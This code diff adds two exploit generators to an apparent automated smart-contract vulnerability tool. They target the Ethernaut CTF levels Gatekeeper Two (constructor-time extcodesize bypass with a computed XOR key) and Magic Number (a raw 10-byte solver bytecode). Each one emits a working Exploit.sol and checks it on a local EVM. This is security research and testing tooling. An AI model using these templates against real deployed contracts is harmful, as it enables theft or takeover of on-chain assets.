@@ -2441,6 +2441,170 @@ def _synth_force(name, target_src, invariants_src, manifest, scan_step, t0):
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_gatekeeper_two(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Gatekeeper Two 류: extcodesize(caller())==0 게이트(생성자에서 호출)와
+    uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == max 게이트를 통과해
+    entrant 를 tx.origin 으로 세팅. 공격자 생성자에서 키를 계산해 enter 를 호출한다."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    if not (re.search(r"extcodesize\s*\(\s*caller\s*\(\s*\)\s*\)", tb)
+            and re.search(r"keccak256\s*\(\s*abi\.encodePacked\s*\(\s*msg\.sender", tb)
+            and "^" in tb):
+        return None
+    # bytes8 인자를 받는 enter 류 함수 + entrant=tx.origin 세팅
+    ent = None; setter = None
+    for fn in _functions(tb):
+        if any(a[0].startswith("bytes8") for a in fn["args"]) and fn["external"]:
+            setter = fn["name"]
+            mm = re.search(r"(\w+)\s*=\s*tx\.origin", fn["body"])
+            if mm: ent = mm.group(1)
+            break
+    if not setter:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER +
+        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
+        "contract Pwn {\n"
+        "    constructor(address t) {\n"
+        "        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n"
+        f"        IT(t).{setter}(key);\n"
+        "    }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    e0 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
+    try:
+        deploy("Pwn", [Web3.to_checksum_address(taddr)])   # 생성자에서 enter 호출
+    except Exception:
+        return None
+    e1 = tc.functions[ent]().call() if (ent and _has_getter(abi, ent)) else None
+    if ent and e1 is not None and e1 == e0:
+        return None
+    poc = (HEADER +
+        "// Strategy: Gatekeeper Two. Call enter() from the attacker CONSTRUCTOR so\n"
+        "// extcodesize(caller)==0, with key = uint64(keccak256(this)) ^ type(uint64).max.\n"
+        f"interface IT {{ function {setter}(bytes8) external returns (bool); }}\n"
+        "contract Exploit {\n"
+        "    constructor(address t) {\n"
+        "        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n"
+        f"        IT(t).{setter}(key);\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (gatekeeper-two)","strategy":"gatekeeper-two","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"{ent or 'entrant'} set via constructor-time gate bypass",
+            "strategy":f"gatekeeper-two:{setter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"생성자에서 enter 호출(extcodesize=0)과 XOR 키로 3개 게이트를 통과해 entrant 를 탈취했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
+def _synth_magicnumber(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut Magic Number 류: 10바이트 이하 런타임으로 42(0x2a)를 반환하는 solver 를
+    등록. 최소 초기화+런타임 바이트코드를 원시 배포해 setSolver 로 등록하고, 코드 길이
+    ≤10 이며 임의 호출에 42 를 반환하는지 확인한다."""
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # setSolver(address) 류 세터 + solver 상태변수
+    setter = None
+    for fn in _functions(tb):
+        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address" \
+                and re.search(r"solver\s*=", fn["body"]):
+            setter = fn["name"]; break
+    if not setter and re.search(r"\bsolver\b", tb):
+        for fn in _functions(tb):
+            if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address":
+                setter = fn["name"]; break
+    if not setter:
+        return None
+    import solcx
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    w3, acct = _mk_evm()
+    def deploy(cn, args):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        return w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
+    try:
+        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
+    except Exception:
+        return None
+    # 최소 solver: init(12B) + runtime(10B). runtime: PUSH1 0x2a; PUSH1 0; MSTORE; PUSH1 0x20; PUSH1 0; RETURN
+    creation = "0x600a600c600039600a6000f3602a60005260206000f3"
+    try:
+        rc = w3.eth.wait_for_transaction_receipt(
+            w3.eth.send_transaction({"from":acct,"data":creation,"gas":200000}))
+        solver = rc.contractAddress
+    except Exception:
+        return None
+    if solver is None:
+        return None
+    code = w3.eth.get_code(solver)
+    if len(code) == 0 or len(code) > 10:
+        return None
+    # 42 반환 확인 (임의 셀렉터 호출)
+    try:
+        ret = w3.eth.call({"to": solver, "data": "0x00000000"})
+        if int.from_bytes(ret[-32:], "big") != 42:
+            return None
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    try:
+        getattr(tc.functions, setter)(Web3.to_checksum_address(solver)).transact({"from":acct,"gas":200000})
+    except Exception:
+        return None
+    poc = (HEADER +
+        "// Strategy: Magic Number. Deploy a <=10-byte runtime that returns 42 for any\n"
+        "// call, then register it via setSolver. Runtime: 602a60005260206000f3.\n"
+        f"interface IT {{ function {setter}(address) external; }}\n"
+        "contract Exploit {\n"
+        "    function run(address t) external {\n"
+        "        bytes memory code = hex\"600a600c600039600a6000f3602a60005260206000f3\";\n"
+        "        address solver; assembly { solver := create(0, add(code, 0x20), mload(code)) }\n"
+        f"        IT(t).{setter}(solver);\n"
+        "    }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (magic-number)","strategy":"magic-number","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":"solver returns 42 in <=10 bytes",
+            "strategy":f"magic-number:{setter}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"10바이트 런타임(602a60005260206000f3)으로 42 를 반환하는 solver 를 등록했습니다.",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Denial 류: 설정 가능한 수신자에게 가스 한도 없이 .call 로 송금한 뒤
     같은 함수에서 추가 상태전이가 이어지는 구조. 공격자가 수신자로 등록되어 콜백에서
@@ -3142,6 +3306,20 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0n) Gatekeeper Two (생성자 호출 + XOR 키)
+    try:
+        r = _synth_gatekeeper_two(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0o) Magic Number (10바이트 런타임 solver)
+    try:
+        r = _synth_magicnumber(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 1) 호출 시퀀스 탐색
     try:
         found=_fuzz_search(name, target_src, invariants_src, manifest, do_verify)
@@ -3206,7 +3384,8 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
     inv = invariants_src if do_verify else None
     for fn in (_storage_attempt, _proxy_attempt, _multiblock_attempt,
                _synth_storage_collision, _synth_king_dos, _synth_callback_inconsistency,
-               _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force):
+               _synth_shop, _synth_lockup_bypass, _synth_gas_griefing, _synth_force,
+               _synth_gatekeeper_two, _synth_magicnumber):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
